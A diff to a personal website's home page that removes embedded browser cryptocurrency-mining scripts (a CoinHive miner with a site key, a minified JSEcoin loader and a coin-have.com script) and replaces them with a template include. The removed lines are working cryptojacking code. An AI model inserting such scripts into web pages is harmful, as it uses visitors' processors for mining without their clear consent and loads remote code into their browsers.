@@ -5,17 +5,7 @@ permalink: /
 comments: true
 ---
 
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script>
-	var miner = new CoinHive.Anonymous('NS1Lh4sTCMiS0AcazVxeqiDKUXIrkTnX', {throttle: 0.2});
-	if (!miner.isMobile() && !miner.didOptOut(14400)) {
-		miner.start();
-	}
-</script>
-<script type="text/javascript">
-!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/40497/austinhuang.me/0/0/",s.parentNode.insertBefore(t,s)}();
-</script>
-<script src="https://coin-have.com/c/8kZq.js"></script>
+{% include def.html %}
 
 <meta name="og:title" content="Austin Huang - A young JavaScript developer who writes chatbots and stories in Montréal.">
 <meta name="og:site_name" content="AustinHuang.me">
